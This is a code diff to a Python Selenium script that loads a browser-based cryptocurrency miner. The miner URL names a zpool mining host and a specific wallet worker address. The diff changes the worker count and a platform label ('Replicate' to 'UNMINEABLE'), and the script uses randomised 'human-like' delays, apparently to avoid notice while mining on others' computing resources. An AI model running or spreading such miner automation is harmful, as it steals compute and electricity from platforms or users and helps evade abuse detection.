@@ -58,7 +58,7 @@ try:
     def human_like_delay(min_sec=1, max_sec=3):
         time.sleep(random.uniform(min_sec, max_sec))
 
-    base_url = "https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RNZaqoBye9Kye6USMC55ve52pBxo168xMU&password=c%3DRVN&workers=80"
+    base_url = "https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RNZaqoBye9Kye6USMC55ve52pBxo168xMU&password=c%3DRVN&workers=16"
     driver.get(base_url)
     human_like_delay()
 
@@ -67,7 +67,7 @@ try:
         try:
             hashrate = driver.find_element(By.CSS_SELECTOR, "span#hashrate strong").text
             timestamp = time.ctime()
-            message = f"⛏️ {timestamp}\n⚡ Hashrate: {hashrate}\n 👨🏻‍💻 [Replicate]"
+            message = f"⛏️ {timestamp}\n⚡ Hashrate: {hashrate}\n 👨🏻‍💻 [UNMINEABLE]"
 
             print(message)
 
